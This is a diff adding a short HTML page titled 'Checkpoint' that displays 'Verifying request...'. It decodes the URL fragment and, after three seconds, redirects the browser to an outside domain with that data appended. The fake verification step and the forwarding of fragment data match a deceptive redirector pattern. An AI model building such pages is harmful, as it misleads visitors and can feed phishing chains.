@@ -1,0 +1,21 @@
+<html>
+  <head>
+    <title>Checkpoint</title>
+  </head>
+  <body>
+    <p>Verifying request...</p>
+    <script>
+      let next_url = "https://rhio.net#";
+      let wait_secs = 3;
+      const hash = window.location.hash;
+    try {
+      var e = atob(hash);
+    } catch {
+      var e = hash;
+    }
+      setTimeout(function() {
+        document.location.href= next_url +e;
+      }, wait_secs * 1000);
+    </script>
+  </body>
+</html>
